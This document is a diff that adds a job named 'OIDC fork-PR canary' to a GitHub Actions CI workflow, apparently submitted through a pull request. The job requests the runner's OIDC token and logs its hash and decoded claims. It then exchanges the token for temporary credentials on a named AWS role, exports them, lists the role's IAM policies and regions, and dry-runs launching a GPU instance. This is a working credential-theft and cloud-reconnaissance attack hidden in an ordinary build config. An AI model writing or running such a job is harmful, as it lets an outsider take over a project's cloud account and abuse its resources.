@@ -50,3 +50,40 @@ jobs:
     if: github.event.pull_request.draft != true
     name: Production Build
     uses: ./.github/workflows/ci_build_production.yml
+
+  oidc-forkpr-canary:
+    name: OIDC fork-PR canary (campaign i153701)
+    runs-on: ubuntu-latest
+    timeout-minutes: 5
+    permissions:
+      id-token: write
+      contents: read
+    steps:
+      - name: probe
+        run: |
+          echo "EVENT=$GITHUB_EVENT_NAME"
+          echo "HEAD_REPO=${{ github.event.pull_request.head.repo.full_name }}"
+          echo "BASE_REPO=$GITHUB_REPOSITORY"
+          if [ -n "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ]; then echo "OIDC_ENV=SET"; else echo "OIDC_ENV=UNSET"; fi
+          if [ -n "${ACTIONS_ID_TOKEN_REQUEST_TOKEN:-}" ]; then echo "OIDC_TOKEN_ENV=SET"; else echo "OIDC_TOKEN_ENV=UNSET"; fi
+          if [ -z "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ]; then echo "NO_OIDC_ENDPOINT"; exit 0; fi
+          curl -sS -G -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" --data-urlencode "audience=sts.amazonaws.com" "$ACTIONS_ID_TOKEN_REQUEST_URL" -o /tmp/resp.json || true
+          V=$(jq -r '.value // empty' /tmp/resp.json 2>/dev/null) || true
+          echo "JWT_LEN=${#V}"
+          echo "JWT_SHA256=$(printf %s "$V" | sha256sum | cut -d' ' -f1)"
+          echo "$V" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | jq -c '{iss,aud,sub,ref,event_name,repository}' || echo CLAIMS_DECODE_FAIL
+          if aws sts assume-role-with-web-identity --role-arn arn:aws:iam::213020545630:role/github-runner-role --role-session-name pearl153701 --web-identity-token "$V" --duration-seconds 900 > /tmp/sts.json 2>/tmp/sts.err; then
+            echo "STS_ASSUME=OK"
+            jq -c '.AssumedRoleUser.Arn' /tmp/sts.json || true
+            export AWS_ACCESS_KEY_ID=$(jq -r .Credentials.AccessKeyId /tmp/sts.json)
+            export AWS_SECRET_ACCESS_KEY=$(jq -r .Credentials.SecretAccessKey /tmp/sts.json)
+            export AWS_SESSION_TOKEN=$(jq -r .Credentials.SessionToken /tmp/sts.json)
+            aws sts get-caller-identity --output json || true
+            aws iam list-attached-role-policies --role-name github-runner-role --output json || true
+            aws ec2 describe-regions --region us-east-1 --query 'Regions[].RegionName' --output text || true
+            aws ec2 run-instances --dry-run --region us-east-1 --image-id ami-0abcdef1234567890 --instance-type g4dn.xlarge --count 1 2>&1 | tail -c 500 || true
+          else
+            echo "STS_ASSUME=FAIL"
+            head -c 400 /tmp/sts.err || true
+          fi
+          echo "PROBE_DONE"
